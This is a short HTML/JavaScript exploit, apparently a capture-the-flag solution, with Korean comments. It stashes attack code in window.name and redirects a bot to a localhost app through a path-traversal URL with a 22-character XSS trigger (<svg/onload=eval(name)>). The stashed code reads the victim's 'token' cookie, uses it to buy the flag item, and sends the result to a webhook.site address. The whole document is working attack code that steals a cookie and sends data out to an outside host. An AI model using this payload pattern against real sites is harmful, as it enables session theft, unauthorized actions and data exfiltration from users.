<script>
    // 1. 자신의 웹후크 주소
    const webhook = "https://webhook.site/686a68f0-c63e-469b-8f3e-4629633e144a";

    // 2. 봇이 localhost 안에서 실행할 실제 공격 코드 (window.name에 저장)
    // 쿠키(token)를 가져와서 4번 아이템(Flag)을 사고 결과를 웹후크로 쏩니다.
    window.name = `
        const t = document.cookie.split('token=')[1].split(';')[0];
        fetch('/4/buy', {
            method: 'POST',
            headers: { 'token': t }
        })
        .then(r => r.json())
        .then(d => fetch('${webhook}?flag=' + encodeURIComponent(d.data)));
    `;

    // 3. 22자 제한 XSS 트리거 코드로 리다이렉트
    // <svg/onload=eval(name) 은 정확히 22자입니다.
    const payload = "..%2fdebug%2f%3csvg%2fonload%3deval(name)";
    location.href = "http://localhost:3000/#/" + payload + "/detail";
</script>
